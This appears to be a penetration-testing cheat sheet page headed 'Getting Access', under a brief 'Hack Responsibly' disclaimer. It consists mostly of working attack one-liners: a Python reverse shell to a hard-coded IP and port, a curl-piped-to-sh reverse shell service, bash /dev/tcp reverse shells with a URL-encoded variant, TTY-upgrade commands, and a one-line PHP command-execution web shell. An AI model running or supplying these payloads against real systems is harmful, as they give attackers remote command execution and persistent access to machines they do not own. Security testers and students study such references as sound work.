# Getting Access

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## Reverse Shells

### Python Reverse Shell

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Reverse Shell as a Service - [https://shell.now.sh](https://shell.now.sh)

[https://github.com/lukechilds/reverse-shell](https://github.com/lukechilds/reverse-shell)  

```bash
curl https://shell.now.sh/<ip>:<port> | sh
```

## Upgrading remote shells

```bash
python -c 'import pty;pty.spawn("/bin/bash")'; 
ctrl-z #send to background
stty raw -echo #https://stackoverflow.com/questions/22832933/what-does-stty-raw-echo-do-on-os-x
stty -a #get local number of rows & columns
fg #to return shell to foreground
stty rows <x> columns <y> #Set remote shell to x number of rows & y columns
export TERM=xterm-256color #allows you to clear console, and have color output
```

To upgrade to fully interactive shell \(python example\):

```python
1. python -c 'import pty; pty.spawn("/bin/sh")'
2. perl -e 'exec "/bin/sh";'
3. ruby -e 'exec "/bin/sh"'
```

### Upgrade shells:

```bash
bash -i >& /dev/tct/10.10.14.148/9001 0>&1

#URL encoded: 
bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
```

bash reverse shell:

simple php shell: `<?php system($_GET['variable_name']); ?>`

